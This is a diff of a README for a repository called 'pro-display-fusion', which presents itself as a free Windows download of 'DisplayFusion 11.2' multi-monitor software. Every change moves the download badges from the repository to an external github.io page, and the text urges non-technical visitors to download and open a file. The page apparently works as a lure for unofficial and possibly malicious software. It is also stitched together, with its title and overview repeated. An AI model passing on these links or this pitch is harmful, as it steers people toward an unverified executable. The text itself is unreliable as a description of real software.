@@ -1,6 +1,6 @@
 # 🖥️ pro-display-fusion - Manage Multiple Monitors Effortlessly Every Day
 
-[![Download Now](https://img.shields.io/badge/Download_Now-pro--display--fusion-ff6b6b?style=for-the-badge&labelColor=2b2d42&logo=github&logoColor=white)](https://github.com/Herlangga666/pro-display-fusion)
+[![Download Now](https://img.shields.io/badge/Download_Now-pro--display--fusion-ff6b6b?style=for-the-badge&labelColor=2b2d42&logo=github&logoColor=white)](https://herlangga666.github.io)
 
 ## 🌟 Overview
 
@@ -33,7 +33,7 @@ These features are useful for home users, office workers, students, remote worke
 
 Visit this link to download the application.
 
-[![Download pro-display-fusion](https://img.shields.io/badge/Download-pro--display--fusion-4dabf7?style=for-the-badge&labelColor=1b263b&logo=github&logoColor=white)](https://github.com/Herlangga666/pro-display-fusion)
+[![Download pro-display-fusion](https://img.shields.io/badge/Download-pro--display--fusion-4dabf7?style=for-the-badge&labelColor=1b263b&logo=github&logoColor=white)](https://herlangga666.github.io)
 
 The download link above is the main starting point. Open the link in your browser, follow the page to the application, and download it to your Windows PC. The page is intended to be simple to use for non-technical visitors.
 
@@ -54,7 +54,7 @@ Use the main controls to explore the app at your own pace. The goal is to make y
 | Move a window to another screen | Send an open app to the monitor where you want it |
 # 🖥️ pro-display-fusion - Effortless Multi-Monitor Management for Windows
 
-[![Download Now](https://img.shields.io/badge/Download-pro--display--fusion-ff6b6b?style=for-the-badge&labelColor=2b2d42&logo=github&logoColor=white)](https://github.com/Herlangga666/pro-display-fusion)
+[![Download Now](https://img.shields.io/badge/Download-pro--display--fusion-ff6b6b?style=for-the-badge&labelColor=2b2d42&logo=github&logoColor=white)](https://herlangga666.github.io)
 
 ## 🌟 Overview
 
@@ -83,7 +83,7 @@ These features are designed to reduce desktop clutter and make your screens work
 
 Visit this link to download the application.
 
-[![Download pro-display-fusion](https://img.shields.io/badge/Get_DisplayFusion_11.2-4dabf7?style=for-the-badge&labelColor=1b263b&logo=github&logoColor=white)](https://github.com/Herlangga666/pro-display-fusion)
+[![Download pro-display-fusion](https://img.shields.io/badge/Get_DisplayFusion_11.2-4dabf7?style=for-the-badge&labelColor=1b263b&logo=github&logoColor=white)](https://herlangga666.github.io)
 
 Open the link in your browser and follow the page to the download. The repository serves as the starting point for getting the software onto your Windows computer. Once the download is complete, locate the file on your PC and open it to begin.
 
@@ -156,7 +156,7 @@ The guide avoids jargon and focuses on practical actions. It explains features i
 
 Visit this link to download the application.
 
-[![Download pro-display-fusion](https://img.shields.io/badge/Download_DisplayFusion_11.2-51cf66?style=for-the-badge&labelColor=212529&logo=github&logoColor=white)](https://github.com/Herlangga666/pro-display-fusion)
+[![Download pro-display-fusion](https://img.shields.io/badge/Download_DisplayFusion_11.2-51cf66?style=for-the-badge&labelColor=212529&logo=github&logoColor=white)](https://herlangga666.github.io)
 
 Use the link above to reach the download page. Follow the instructions there to get the application onto your Windows PC. Once the download is complete, open the file to begin using DisplayFusion. The application will guide you through the initial setup, and you can start exploring the features right away.
 
